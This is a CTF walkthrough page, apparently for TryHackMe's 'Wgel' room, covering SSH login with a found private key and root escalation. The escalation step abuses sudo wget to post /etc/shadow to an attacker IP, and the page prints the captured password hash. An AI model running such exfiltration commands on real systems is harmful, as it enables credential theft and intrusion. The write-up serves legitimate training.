---
sidebar_position: 2
description: Wgel
keywords: [wgel, wgel tryhackme, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, ffuf, privilege escalation, wget privilege escalation]
---

import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';


# Exploitation

## Permissions

- Assign the Correct Permissions to the `Private SSH Key`

:::caution Assign The Correct Permissions To ID_RSA

<Tabs>
  <TabItem value="chmod" label="CHMOD"> 
    <div style={{color: 'red'}}>

```bash
chmod 600 id_rsa
```

</div>
  </TabItem>
  <TabItem value="other" label="Connecting To SSH Using ID_RSA"> 
    <div style={{color: 'red'}}>

```bash
ssh -i id_rsa wgel@VICTIM_IP
```

</div>
  </TabItem>
</Tabs>

:::


<br/>

---
## Privilege Escalation

- **We can Login using the `Private SSH Key`**

```bash
jessie@CorpOne:~$ id
uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

<br/>

- **The User `jessie` can run:** <b style={{ color: 'Coral' }}>/usr/bin/wget</b> <span style={{fontWeight: 'Bold'}}>as</span> <b style={{ color: 'Red' }}>ROOT</b>
- `wget` can be used to Access Files on the System.

```bash
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/etc/shadow 10.11.30.40
--2022-10-07 12:21:03--  http://10.11.30.40/
Connecting to 10.11.30.40:80... connected.
```

<br/>

- Using `netcat` to get the File.

```bash
Connection from 10.10.250.65:39072
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Host: 10.11.30.40

...
jessie:$6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663bXfIV7y.ywZxeOinj4Mckj8/uvA7U.:18195:0:99999:7:::
...
```

---